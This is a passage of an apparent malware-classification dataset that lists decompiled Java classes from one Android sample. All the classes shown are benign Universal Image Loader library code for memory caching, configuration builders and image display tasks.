"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory\MemoryCacheAware.code","@Deprecated public interface MemoryCacheAware<K,V> {   void clear();   V get(  K k);   Collection<K> keys();   boolean put(  K k,  V v);   V remove(  K k); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\FIFOLimitedMemoryCache.code","public class FIFOLimitedMemoryCache extends LimitedMemoryCache {   private final List<Bitmap> queue;   public FIFOLimitedMemoryCache(  int sizeLimit){     super(sizeLimit);     this.queue=Collections.synchronizedList(new LinkedList());   }   @Override public boolean put(  String key,  Bitmap value){     if (!super.put(key,value)) {       return false;     }     this.queue.add(value);     return true;   }   @Override public Bitmap remove(  String key){     Bitmap value=super.get(key);     if (value != null) {       this.queue.remove(value);     }     return super.remove(key);   }   @Override public void clear(){     this.queue.clear();     super.clear();   }   @Override protected int getSize(  Bitmap value){     return value.getRowBytes() * value.getHeight();   }   @Override protected Bitmap removeNext(){     return this.queue.remove(0);   }   @Override protected Reference<Bitmap> createReference(  Bitmap value){     return new WeakReference(value);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\FuzzyKeyMemoryCache.code","public class FuzzyKeyMemoryCache implements MemoryCache {   private final MemoryCache cache;   private final Comparator<String> keyComparator;   public FuzzyKeyMemoryCache(  MemoryCache cache,  Comparator<String> keyComparator){     this.cache=cache;     this.keyComparator=keyComparator;   }   @Override public boolean put(  String key,  Bitmap value){ synchronized (this.cache) {       String keyToRemove=null;       Iterator i$=this.cache.keys().iterator();       while (true) {         if (!i$.hasNext()) {           break;         }         String cacheKey=i$.next();         if (this.keyComparator.compare(key,cacheKey) == 0) {           keyToRemove=cacheKey;           break;         }       }       if (keyToRemove != null) {         this.cache.remove(keyToRemove);       }     }     return this.cache.put(key,value);   }   @Override public Bitmap get(  String key){     return this.cache.get(key);   }   @Override public Bitmap remove(  String key){     return this.cache.remove(key);   }   @Override public void clear(){     this.cache.clear();   }   @Override public Collection<String> keys(){     return this.cache.keys();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\LargestLimitedMemoryCache.code","public class LargestLimitedMemoryCache extends LimitedMemoryCache {   private final Map<Bitmap,Integer> valueSizes;   public LargestLimitedMemoryCache(  int sizeLimit){     super(sizeLimit);     this.valueSizes=Collections.synchronizedMap(new HashMap());   }   @Override public boolean put(  String key,  Bitmap value){     if (!super.put(key,value)) {       return false;     }     this.valueSizes.put(value,Integer.valueOf(getSize(value)));     return true;   }   @Override public Bitmap remove(  String key){     Bitmap value=super.get(key);     if (value != null) {       this.valueSizes.remove(value);     }     return super.remove(key);   }   @Override public void clear(){     this.valueSizes.clear();     super.clear();   }   @Override protected int getSize(  Bitmap value){     return value.getRowBytes() * value.getHeight();   }   @Override protected Bitmap removeNext(){     Integer maxSize=null;     Bitmap largestValue=null;     Set<Map.Entry<Bitmap,Integer>> entries=this.valueSizes.entrySet(); synchronized (this.valueSizes) {       for (      Map.Entry<Bitmap,Integer> entry : entries) {         if (largestValue == null) {           largestValue=entry.getKey();           maxSize=entry.getValue();         }  else {           Integer size=entry.getValue();           if (size.intValue() > maxSize.intValue()) {             maxSize=size;             largestValue=entry.getKey();           }         }       }     }     this.valueSizes.remove(largestValue);     return largestValue;   }   @Override protected Reference<Bitmap> createReference(  Bitmap value){     return new WeakReference(value);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\LimitedAgeMemoryCache.code","public class LimitedAgeMemoryCache implements MemoryCache {   private final MemoryCache cache;   private final Map<String,Long> loadingDates=Collections.synchronizedMap(new HashMap());   private final long maxAge;   public LimitedAgeMemoryCache(  MemoryCache cache,  long maxAge){     this.cache=cache;     this.maxAge=1000 * maxAge;   }   @Override public boolean put(  String key,  Bitmap value){     boolean putSuccesfully=this.cache.put(key,value);     if (putSuccesfully) {       this.loadingDates.put(key,Long.valueOf(System.currentTimeMillis()));     }     return putSuccesfully;   }   @Override public Bitmap get(  String key){     Long loadingDate=this.loadingDates.get(key);     if (loadingDate != null && System.currentTimeMillis() - loadingDate.longValue() > this.maxAge) {       this.cache.remove(key);       this.loadingDates.remove(key);     }     return this.cache.get(key);   }   @Override public Bitmap remove(  String key){     this.loadingDates.remove(key);     return this.cache.remove(key);   }   @Override public Collection<String> keys(){     return this.cache.keys();   }   @Override public void clear(){     this.cache.clear();     this.loadingDates.clear();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\LRULimitedMemoryCache.code","public class LRULimitedMemoryCache extends LimitedMemoryCache {   private static final int INITIAL_CAPACITY=10;   private static final float LOAD_FACTOR=1.1f;   private final Map<String,Bitmap> lruCache;   public LRULimitedMemoryCache(  int maxSize){     super(maxSize);     this.lruCache=Collections.synchronizedMap(new LinkedHashMap(10,LOAD_FACTOR,true));   }   @Override public boolean put(  String key,  Bitmap value){     if (!super.put(key,value)) {       return false;     }     this.lruCache.put(key,value);     return true;   }   @Override public Bitmap get(  String key){     this.lruCache.get(key);     return super.get(key);   }   @Override public Bitmap remove(  String key){     this.lruCache.remove(key);     return super.remove(key);   }   @Override public void clear(){     this.lruCache.clear();     super.clear();   }   @Override protected int getSize(  Bitmap value){     return value.getRowBytes() * value.getHeight();   }   @Override protected Bitmap removeNext(){     Bitmap mostLongUsedValue=null; synchronized (this.lruCache) {       Iterator<Map.Entry<String,Bitmap>> it=this.lruCache.entrySet().iterator();       if (it.hasNext()) {         Map.Entry<String,Bitmap> entry=it.next();         mostLongUsedValue=entry.getValue();         it.remove();       }     }     return mostLongUsedValue;   }   @Override protected Reference<Bitmap> createReference(  Bitmap value){     return new WeakReference(value);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\LruMemoryCache.code","public class LruMemoryCache implements MemoryCache {   private final LinkedHashMap<String,Bitmap> map;   private final int maxSize;   private int size;   public LruMemoryCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   @Override public final Bitmap get(  String key){     Bitmap bitmap;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       bitmap=this.map.get(key);     }     return bitmap;   }   @Override public final boolean put(  String key,  Bitmap value){     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.size+=sizeOf(key,value);       Bitmap previous=this.map.put(key,value);       if (previous != null) {         this.size-=sizeOf(key,previous);       }     }     trimToSize(this.maxSize);     return true;   }   private void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: com.nostra13.universalimageloader.cache.memory.impl.LruMemoryCache.trimToSize(int):void"");   }   @Override public final Bitmap remove(  String key){     Bitmap previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=sizeOf(key,previous);       }     }     return previous;   }   @Override public Collection<String> keys(){     HashSet hashSet; synchronized (this) {       hashSet=new HashSet(this.map.keySet());     }     return hashSet;   }   @Override public void clear(){     trimToSize(-1);   }   private int sizeOf(  String key,  Bitmap value){     return value.getRowBytes() * value.getHeight();   }   public final synchronized String toString(){     return String.format(""LruCache[maxSize=%d]"",Integer.valueOf(this.maxSize));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\UsingFreqLimitedMemoryCache.code","public class UsingFreqLimitedMemoryCache extends LimitedMemoryCache {   private final Map<Bitmap,Integer> usingCounts;   public UsingFreqLimitedMemoryCache(  int sizeLimit){     super(sizeLimit);     this.usingCounts=Collections.synchronizedMap(new HashMap());   }   @Override public boolean put(  String key,  Bitmap value){     if (!super.put(key,value)) {       return false;     }     this.usingCounts.put(value,0);     return true;   }   @Override public Bitmap get(  String key){     Integer usageCount;     Bitmap value=super.get(key);     if (value != null && (usageCount=this.usingCounts.get(value)) != null) {       this.usingCounts.put(value,Integer.valueOf(usageCount.intValue() + 1));     }     return value;   }   @Override public Bitmap remove(  String key){     Bitmap value=super.get(key);     if (value != null) {       this.usingCounts.remove(value);     }     return super.remove(key);   }   @Override public void clear(){     this.usingCounts.clear();     super.clear();   }   @Override protected int getSize(  Bitmap value){     return value.getRowBytes() * value.getHeight();   }   @Override protected Bitmap removeNext(){     Integer minUsageCount=null;     Bitmap leastUsedValue=null;     Set<Map.Entry<Bitmap,Integer>> entries=this.usingCounts.entrySet(); synchronized (this.usingCounts) {       for (      Map.Entry<Bitmap,Integer> entry : entries) {         if (leastUsedValue == null) {           leastUsedValue=entry.getKey();           minUsageCount=entry.getValue();         }  else {           Integer lastValueUsage=entry.getValue();           if (lastValueUsage.intValue() < minUsageCount.intValue()) {             minUsageCount=lastValueUsage;             leastUsedValue=entry.getKey();           }         }       }     }     this.usingCounts.remove(leastUsedValue);     return leastUsedValue;   }   @Override protected Reference<Bitmap> createReference(  Bitmap value){     return new WeakReference(value);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory.impl\WeakMemoryCache.code","public class WeakMemoryCache extends BaseMemoryCache {   @Override protected Reference<Bitmap> createReference(  Bitmap value){     return new WeakReference(value);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\Builder.code","public static class Builder {   private int imageResOnLoading=0;   private int imageResForEmptyUri=0;   private int imageResOnFail=0;   private Drawable imageOnLoading=null;   private Drawable imageForEmptyUri=null;   private Drawable imageOnFail=null;   private boolean resetViewBeforeLoading=false;   private boolean cacheInMemory=false;   private boolean cacheOnDisk=false;   private ImageScaleType imageScaleType=ImageScaleType.IN_SAMPLE_POWER_OF_2;   private BitmapFactory.Options decodingOptions=new BitmapFactory.Options();   private int delayBeforeLoading=0;   private boolean considerExifParams=false;   private Object extraForDownloader=null;   private BitmapProcessor preProcessor=null;   private BitmapProcessor postProcessor=null;   private BitmapDisplayer displayer=DefaultConfigurationFactory.createBitmapDisplayer();   private Handler handler=null;   private boolean isSyncLoading=false;   public Builder(){     this.decodingOptions.inPurgeable=true;     this.decodingOptions.inInputShareable=true;   }   @Deprecated public Builder showStubImage(  int imageRes){     this.imageResOnLoading=imageRes;     return this;   }   public Builder showImageOnLoading(  int imageRes){     this.imageResOnLoading=imageRes;     return this;   }   public Builder showImageOnLoading(  Drawable drawable){     this.imageOnLoading=drawable;     return this;   }   public Builder showImageForEmptyUri(  int imageRes){     this.imageResForEmptyUri=imageRes;     return this;   }   public Builder showImageForEmptyUri(  Drawable drawable){     this.imageForEmptyUri=drawable;     return this;   }   public Builder showImageOnFail(  int imageRes){     this.imageResOnFail=imageRes;     return this;   }   public Builder showImageOnFail(  Drawable drawable){     this.imageOnFail=drawable;     return this;   }   public Builder resetViewBeforeLoading(){     this.resetViewBeforeLoading=true;     return this;   }   public Builder resetViewBeforeLoading(  boolean resetViewBeforeLoading){     this.resetViewBeforeLoading=resetViewBeforeLoading;     return this;   }   @Deprecated public Builder cacheInMemory(){     this.cacheInMemory=true;     return this;   }   public Builder cacheInMemory(  boolean cacheInMemory){     this.cacheInMemory=cacheInMemory;     return this;   }   @Deprecated public Builder cacheOnDisc(){     return cacheOnDisk(true);   }   @Deprecated public Builder cacheOnDisc(  boolean cacheOnDisk){     return cacheOnDisk(cacheOnDisk);   }   public Builder cacheOnDisk(  boolean cacheOnDisk){     this.cacheOnDisk=cacheOnDisk;     return this;   }   public Builder imageScaleType(  ImageScaleType imageScaleType){     this.imageScaleType=imageScaleType;     return this;   }   public Builder bitmapConfig(  Bitmap.Config bitmapConfig){     if (bitmapConfig == null) {       throw new IllegalArgumentException(""bitmapConfig can't be null"");     }     this.decodingOptions.inPreferredConfig=bitmapConfig;     return this;   }   public Builder decodingOptions(  BitmapFactory.Options decodingOptions){     if (decodingOptions == null) {       throw new IllegalArgumentException(""decodingOptions can't be null"");     }     this.decodingOptions=decodingOptions;     return this;   }   public Builder delayBeforeLoading(  int delayInMillis){     this.delayBeforeLoading=delayInMillis;     return this;   }   public Builder extraForDownloader(  Object extra){     this.extraForDownloader=extra;     return this;   }   public Builder considerExifParams(  boolean considerExifParams){     this.considerExifParams=considerExifParams;     return this;   }   public Builder preProcessor(  BitmapProcessor preProcessor){     this.preProcessor=preProcessor;     return this;   }   public Builder postProcessor(  BitmapProcessor postProcessor){     this.postProcessor=postProcessor;     return this;   }   public Builder displayer(  BitmapDisplayer displayer){     if (displayer == null) {       throw new IllegalArgumentException(""displayer can't be null"");     }     this.displayer=displayer;     return this;   }   public Builder syncLoading(  boolean isSyncLoading){     this.isSyncLoading=isSyncLoading;     return this;   }   public Builder handler(  Handler handler){     this.handler=handler;     return this;   }   public Builder cloneFrom(  DisplayImageOptions options){     this.imageResOnLoading=options.imageResOnLoading;     this.imageResForEmptyUri=options.imageResForEmptyUri;     this.imageResOnFail=options.imageResOnFail;     this.imageOnLoading=options.imageOnLoading;     this.imageForEmptyUri=options.imageForEmptyUri;     this.imageOnFail=options.imageOnFail;     this.resetViewBeforeLoading=options.resetViewBeforeLoading;     this.cacheInMemory=options.cacheInMemory;     this.cacheOnDisk=options.cacheOnDisk;     this.imageScaleType=options.imageScaleType;     this.decodingOptions=options.decodingOptions;     this.delayBeforeLoading=options.delayBeforeLoading;     this.considerExifParams=options.considerExifParams;     this.extraForDownloader=options.extraForDownloader;     this.preProcessor=options.preProcessor;     this.postProcessor=options.postProcessor;     this.displayer=options.displayer;     this.handler=options.handler;     this.isSyncLoading=options.isSyncLoading;     return this;   }   public DisplayImageOptions build(){     return new DisplayImageOptions(this);   } } public static class Builder {   public static final QueueProcessingType DEFAULT_TASK_PROCESSING_TYPE=QueueProcessingType.FIFO;   public static final int DEFAULT_THREAD_POOL_SIZE=3;   public static final int DEFAULT_THREAD_PRIORITY=4;   private static final String WARNING_OVERLAP_DISK_CACHE_NAME_GENERATOR=""diskCache() and diskCacheFileNameGenerator() calls overlap each other"";   private static final String WARNING_OVERLAP_DISK_CACHE_PARAMS=""diskCache(), diskCacheSize() and diskCacheFileCount calls overlap each other"";   private static final String WARNING_OVERLAP_EXECUTOR=""threadPoolSize(), threadPriority() and tasksProcessingOrder() calls can overlap taskExecutor() and taskExecutorForCachedImages() calls."";   private static final String WARNING_OVERLAP_MEMORY_CACHE=""memoryCache() and memoryCacheSize() calls overlap each other"";   private Context context;   private ImageDecoder decoder;   private int maxImageWidthForMemoryCache=0;   private int maxImageHeightForMemoryCache=0;   private int maxImageWidthForDiskCache=0;   private int maxImageHeightForDiskCache=0;   private BitmapProcessor processorForDiskCache=null;   private Executor taskExecutor=null;   private Executor taskExecutorForCachedImages=null;   private boolean customExecutor=false;   private boolean customExecutorForCachedImages=false;   private int threadPoolSize=3;   private int threadPriority=4;   private boolean denyCacheImageMultipleSizesInMemory=false;   private QueueProcessingType tasksProcessingType=DEFAULT_TASK_PROCESSING_TYPE;   private int memoryCacheSize=0;   private long diskCacheSize=0;   private int diskCacheFileCount=0;   private MemoryCache memoryCache=null;   private DiskCache diskCache=null;   private FileNameGenerator diskCacheFileNameGenerator=null;   private ImageDownloader downloader=null;   private DisplayImageOptions defaultDisplayImageOptions=null;   private boolean writeLogs=false;   public Builder(  Context context){     this.context=context.getApplicationContext();   }   public Builder memoryCacheExtraOptions(  int maxImageWidthForMemoryCache,  int maxImageHeightForMemoryCache){     this.maxImageWidthForMemoryCache=maxImageWidthForMemoryCache;     this.maxImageHeightForMemoryCache=maxImageHeightForMemoryCache;     return this;   }   @Deprecated public Builder discCacheExtraOptions(  int maxImageWidthForDiskCache,  int maxImageHeightForDiskCache,  BitmapProcessor processorForDiskCache){     return diskCacheExtraOptions(maxImageWidthForDiskCache,maxImageHeightForDiskCache,processorForDiskCache);   }   public Builder diskCacheExtraOptions(  int maxImageWidthForDiskCache,  int maxImageHeightForDiskCache,  BitmapProcessor processorForDiskCache){     this.maxImageWidthForDiskCache=maxImageWidthForDiskCache;     this.maxImageHeightForDiskCache=maxImageHeightForDiskCache;     this.processorForDiskCache=processorForDiskCache;     return this;   }   public Builder taskExecutor(  Executor executor){     if (this.threadPoolSize != 3 || this.threadPriority != 4 || this.tasksProcessingType != DEFAULT_TASK_PROCESSING_TYPE) {       L.w(WARNING_OVERLAP_EXECUTOR,new Object[0]);     }     this.taskExecutor=executor;     return this;   }   public Builder taskExecutorForCachedImages(  Executor executorForCachedImages){     if (this.threadPoolSize != 3 || this.threadPriority != 4 || this.tasksProcessingType != DEFAULT_TASK_PROCESSING_TYPE) {       L.w(WARNING_OVERLAP_EXECUTOR,new Object[0]);     }     this.taskExecutorForCachedImages=executorForCachedImages;     return this;   }   public Builder threadPoolSize(  int threadPoolSize){     if (this.taskExecutor != null || this.taskExecutorForCachedImages != null) {       L.w(WARNING_OVERLAP_EXECUTOR,new Object[0]);     }     this.threadPoolSize=threadPoolSize;     return this;   }   public Builder threadPriority(  int threadPriority){     if (this.taskExecutor != null || this.taskExecutorForCachedImages != null) {       L.w(WARNING_OVERLAP_EXECUTOR,new Object[0]);     }     if (threadPriority < 1) {       this.threadPriority=1;     }  else     if (threadPriority > 10) {       this.threadPriority=10;     }  else {       this.threadPriority=threadPriority;     }     return this;   }   public Builder denyCacheImageMultipleSizesInMemory(){     this.denyCacheImageMultipleSizesInMemory=true;     return this;   }   public Builder tasksProcessingOrder(  QueueProcessingType tasksProcessingType){     if (this.taskExecutor != null || this.taskExecutorForCachedImages != null) {       L.w(WARNING_OVERLAP_EXECUTOR,new Object[0]);     }     this.tasksProcessingType=tasksProcessingType;     return this;   }   public Builder memoryCacheSize(  int memoryCacheSize){     if (memoryCacheSize <= 0) {       throw new IllegalArgumentException(""memoryCacheSize must be a positive number"");     }     if (this.memoryCache != null) {       L.w(WARNING_OVERLAP_MEMORY_CACHE,new Object[0]);     }     this.memoryCacheSize=memoryCacheSize;     return this;   }   public Builder memoryCacheSizePercentage(  int availableMemoryPercent){     if (availableMemoryPercent <= 0 || availableMemoryPercent >= 100) {       throw new IllegalArgumentException(""availableMemoryPercent must be in range (0 < % < 100)"");     }     if (this.memoryCache != null) {       L.w(WARNING_OVERLAP_MEMORY_CACHE,new Object[0]);     }     long availableMemory=Runtime.getRuntime().maxMemory();     this.memoryCacheSize=(int)(((float)availableMemory) * (availableMemoryPercent / 100.0f));     return this;   }   public Builder memoryCache(  MemoryCache memoryCache){     if (this.memoryCacheSize != 0) {       L.w(WARNING_OVERLAP_MEMORY_CACHE,new Object[0]);     }     this.memoryCache=memoryCache;     return this;   }   @Deprecated public Builder discCacheSize(  int maxCacheSize){     return diskCacheSize(maxCacheSize);   }   public Builder diskCacheSize(  int maxCacheSize){     if (maxCacheSize <= 0) {       throw new IllegalArgumentException(""maxCacheSize must be a positive number"");     }     if (this.diskCache != null) {       L.w(WARNING_OVERLAP_DISK_CACHE_PARAMS,new Object[0]);     }     this.diskCacheSize=maxCacheSize;     return this;   }   @Deprecated public Builder discCacheFileCount(  int maxFileCount){     return diskCacheFileCount(maxFileCount);   }   public Builder diskCacheFileCount(  int maxFileCount){     if (maxFileCount <= 0) {       throw new IllegalArgumentException(""maxFileCount must be a positive number"");     }     if (this.diskCache != null) {       L.w(WARNING_OVERLAP_DISK_CACHE_PARAMS,new Object[0]);     }     this.diskCacheFileCount=maxFileCount;     return this;   }   @Deprecated public Builder discCacheFileNameGenerator(  FileNameGenerator fileNameGenerator){     return diskCacheFileNameGenerator(fileNameGenerator);   }   public Builder diskCacheFileNameGenerator(  FileNameGenerator fileNameGenerator){     if (this.diskCache != null) {       L.w(WARNING_OVERLAP_DISK_CACHE_NAME_GENERATOR,new Object[0]);     }     this.diskCacheFileNameGenerator=fileNameGenerator;     return this;   }   @Deprecated public Builder discCache(  DiskCache diskCache){     return diskCache(diskCache);   }   public Builder diskCache(  DiskCache diskCache){     if (this.diskCacheSize > 0 || this.diskCacheFileCount > 0) {       L.w(WARNING_OVERLAP_DISK_CACHE_PARAMS,new Object[0]);     }     if (this.diskCacheFileNameGenerator != null) {       L.w(WARNING_OVERLAP_DISK_CACHE_NAME_GENERATOR,new Object[0]);     }     this.diskCache=diskCache;     return this;   }   public Builder imageDownloader(  ImageDownloader imageDownloader){     this.downloader=imageDownloader;     return this;   }   public Builder imageDecoder(  ImageDecoder imageDecoder){     this.decoder=imageDecoder;     return this;   }   public Builder defaultDisplayImageOptions(  DisplayImageOptions defaultDisplayImageOptions){     this.defaultDisplayImageOptions=defaultDisplayImageOptions;     return this;   }   public Builder writeDebugLogs(){     this.writeLogs=true;     return this;   }   public ImageLoaderConfiguration build(){     initEmptyFieldsWithDefaultValues();     return new ImageLoaderConfiguration(this);   }   private void initEmptyFieldsWithDefaultValues(){     if (this.taskExecutor == null) {       this.taskExecutor=DefaultConfigurationFactory.createExecutor(this.threadPoolSize,this.threadPriority,this.tasksProcessingType);     }  else {       this.customExecutor=true;     }     if (this.taskExecutorForCachedImages == null) {       this.taskExecutorForCachedImages=DefaultConfigurationFactory.createExecutor(this.threadPoolSize,this.threadPriority,this.tasksProcessingType);     }  else {       this.customExecutorForCachedImages=true;     }     if (this.diskCache == null) {       if (this.diskCacheFileNameGenerator == null) {         this.diskCacheFileNameGenerator=DefaultConfigurationFactory.createFileNameGenerator();       }       this.diskCache=DefaultConfigurationFactory.createDiskCache(this.context,this.diskCacheFileNameGenerator,this.diskCacheSize,this.diskCacheFileCount);     }     if (this.memoryCache == null) {       this.memoryCache=DefaultConfigurationFactory.createMemoryCache(this.memoryCacheSize);     }     if (this.denyCacheImageMultipleSizesInMemory) {       this.memoryCache=new FuzzyKeyMemoryCache(this.memoryCache,MemoryCacheUtils.createFuzzyKeyComparator());     }     if (this.downloader == null) {       this.downloader=DefaultConfigurationFactory.createImageDownloader(this.context);     }     if (this.decoder == null) {       this.decoder=DefaultConfigurationFactory.createImageDecoder(this.writeLogs);     }     if (this.defaultDisplayImageOptions == null) {       this.defaultDisplayImageOptions=DisplayImageOptions.createSimple();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\DefaultConfigurationFactory.code","public class DefaultConfigurationFactory {   public static Executor createExecutor(  int threadPoolSize,  int threadPriority,  QueueProcessingType tasksProcessingType){     boolean lifo=tasksProcessingType == QueueProcessingType.LIFO;     BlockingQueue<Runnable> taskQueue=lifo ? new LIFOLinkedBlockingDeque<>() : new LinkedBlockingQueue<>();     return new ThreadPoolExecutor(threadPoolSize,threadPoolSize,0L,TimeUnit.MILLISECONDS,taskQueue,createThreadFactory(threadPriority,""uil-pool-""));   }   public static Executor createTaskDistributor(){     return Executors.newCachedThreadPool(createThreadFactory(5,""uil-pool-d-""));   }   public static FileNameGenerator createFileNameGenerator(){     return new HashCodeFileNameGenerator();   }   public static DiskCache createDiskCache(  Context context,  FileNameGenerator diskCacheFileNameGenerator,  long diskCacheSize,  int diskCacheFileCount){     File reserveCacheDir=createReserveDiskCacheDir(context);     if (diskCacheSize > 0 || diskCacheFileCount > 0) {       File individualCacheDir=StorageUtils.getIndividualCacheDirectory(context);       try {         return new LruDiscCache(individualCacheDir,reserveCacheDir,diskCacheFileNameGenerator,diskCacheSize,diskCacheFileCount);       }  catch (      IOException e) {         L.e(e);       }     }     File cacheDir=StorageUtils.getCacheDirectory(context);     return new UnlimitedDiscCache(cacheDir,reserveCacheDir,diskCacheFileNameGenerator);   }   private static File createReserveDiskCacheDir(  Context context){     File cacheDir=StorageUtils.getCacheDirectory(context,false);     File individualDir=new File(cacheDir,""uil-images"");     if (individualDir.exists() || individualDir.mkdir()) {       return individualDir;     }     return cacheDir;   }   public static MemoryCache createMemoryCache(  int memoryCacheSize){     if (memoryCacheSize == 0) {       memoryCacheSize=(int)(Runtime.getRuntime().maxMemory() / 8);     }     return new LruMemoryCache(memoryCacheSize);   }   public static ImageDownloader createImageDownloader(  Context context){     return new BaseImageDownloader(context);   }   public static ImageDecoder createImageDecoder(  boolean loggingEnabled){     return new BaseImageDecoder(loggingEnabled);   }   public static BitmapDisplayer createBitmapDisplayer(){     return new SimpleBitmapDisplayer();   }   private static ThreadFactory createThreadFactory(  int threadPriority,  String threadNamePrefix){     return new DefaultThreadFactory(threadPriority,threadNamePrefix);   } public static class DefaultThreadFactory implements ThreadFactory {     private static final AtomicInteger poolNumber=new AtomicInteger(1);     private final String namePrefix;     private final int threadPriority;     private final AtomicInteger threadNumber=new AtomicInteger(1);     private final ThreadGroup group=Thread.currentThread().getThreadGroup();     DefaultThreadFactory(    int threadPriority,    String threadNamePrefix){       this.threadPriority=threadPriority;       this.namePrefix=threadNamePrefix + poolNumber.getAndIncrement() + ""-thread-"";     }     @Override public Thread newThread(    Runnable r){       Thread t=new Thread(this.group,r,this.namePrefix + this.threadNumber.getAndIncrement(),0L);       if (t.isDaemon()) {         t.setDaemon(false);       }       t.setPriority(this.threadPriority);       return t;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\DefaultThreadFactory.code","public static class DefaultThreadFactory implements ThreadFactory {   private static final AtomicInteger poolNumber=new AtomicInteger(1);   private final String namePrefix;   private final int threadPriority;   private final AtomicInteger threadNumber=new AtomicInteger(1);   private final ThreadGroup group=Thread.currentThread().getThreadGroup();   DefaultThreadFactory(  int threadPriority,  String threadNamePrefix){     this.threadPriority=threadPriority;     this.namePrefix=threadNamePrefix + poolNumber.getAndIncrement() + ""-thread-"";   }   @Override public Thread newThread(  Runnable r){     Thread t=new Thread(this.group,r,this.namePrefix + this.threadNumber.getAndIncrement(),0L);     if (t.isDaemon()) {       t.setDaemon(false);     }     t.setPriority(this.threadPriority);     return t;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\DisplayBitmapTask.code","public final class DisplayBitmapTask implements Runnable {   private static final String LOG_DISPLAY_IMAGE_IN_IMAGEAWARE=""Display image in ImageAware (loaded from %1$s) [%2$s]"";   private static final String LOG_TASK_CANCELLED_IMAGEAWARE_COLLECTED=""ImageAware was collected by GC. Task is cancelled. [%s]"";   private static final String LOG_TASK_CANCELLED_IMAGEAWARE_REUSED=""ImageAware is reused for another image. Task is cancelled. [%s]"";   private final Bitmap bitmap;   private final BitmapDisplayer displayer;   private final ImageLoaderEngine engine;   private final ImageAware imageAware;   private final String imageUri;   private final ImageLoadingListener listener;   private final LoadedFrom loadedFrom;   private final String memoryCacheKey;   public DisplayBitmapTask(  Bitmap bitmap,  ImageLoadingInfo imageLoadingInfo,  ImageLoaderEngine engine,  LoadedFrom loadedFrom){     this.bitmap=bitmap;     this.imageUri=imageLoadingInfo.uri;     this.imageAware=imageLoadingInfo.imageAware;     this.memoryCacheKey=imageLoadingInfo.memoryCacheKey;     this.displayer=imageLoadingInfo.options.getDisplayer();     this.listener=imageLoadingInfo.listener;     this.engine=engine;     this.loadedFrom=loadedFrom;   }   @Override public void run(){     if (this.imageAware.isCollected()) {       L.d(LOG_TASK_CANCELLED_IMAGEAWARE_COLLECTED,this.memoryCacheKey);       this.listener.onLoadingCancelled(this.imageUri,this.imageAware.getWrappedView());     }  else     if (isViewWasReused()) {       L.d(LOG_TASK_CANCELLED_IMAGEAWARE_REUSED,this.memoryCacheKey);       this.listener.onLoadingCancelled(this.imageUri,this.imageAware.getWrappedView());     }  else {       L.d(LOG_DISPLAY_IMAGE_IN_IMAGEAWARE,this.loadedFrom,this.memoryCacheKey);       this.displayer.display(this.bitmap,this.imageAware,this.loadedFrom);       this.engine.cancelDisplayTaskFor(this.imageAware);       this.listener.onLoadingComplete(this.imageUri,this.imageAware.getWrappedView(),this.bitmap);     }   }   private boolean isViewWasReused(){     String currentCacheKey=this.engine.getLoadingUriForView(this.imageAware);     return !this.memoryCacheKey.equals(currentCacheKey);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\DisplayImageOptions.code","public final class DisplayImageOptions {   private final boolean cacheInMemory;   private final boolean cacheOnDisk;   private final boolean considerExifParams;   private final BitmapFactory.Options decodingOptions;   private final int delayBeforeLoading;   private final BitmapDisplayer displayer;   private final Object extraForDownloader;   private final Handler handler;   private final Drawable imageForEmptyUri;   private final Drawable imageOnFail;   private final Drawable imageOnLoading;   private final int imageResForEmptyUri;   private final int imageResOnFail;   private final int imageResOnLoading;   private final ImageScaleType imageScaleType;   private final boolean isSyncLoading;   private final BitmapProcessor postProcessor;   private final BitmapProcessor preProcessor;   private final boolean resetViewBeforeLoading;   private DisplayImageOptions(  Builder builder){     this.imageResOnLoading=builder.imageResOnLoading;     this.imageResForEmptyUri=builder.imageResForEmptyUri;     